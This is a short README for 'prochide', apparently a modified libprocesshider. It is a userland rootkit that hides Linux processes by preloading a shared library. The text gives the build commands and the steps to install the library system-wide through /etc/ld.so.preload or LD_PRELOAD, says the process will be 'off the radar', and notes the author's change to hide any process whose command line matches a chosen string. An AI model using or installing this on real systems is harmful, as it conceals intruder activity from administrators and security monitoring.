prochide
===============

Hide a process under Linux using the ld preloader.

Full tutorial available at https://sysdigcloud.com/hiding-linux-processes-for-fun-and-profit/

In short, compile the library:

```
gerbsec@lool:~/libprocesshider$ make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
gerbsec@lool:~/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/

```

Load it with the global dynamic linker

```
gerbsec@lool:~# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```

Better way:
```
export LD_PRELOAD=${PWD}/libprocesshider.so
```

And your process will be off the radar

I updated the code to hide everything with the "string" that you provide.

With the old code it only used process names and that doesn't work. With this version it bases it off the cmdline which in turn will for example hide `bash` regardless of when it was used in the command. :D
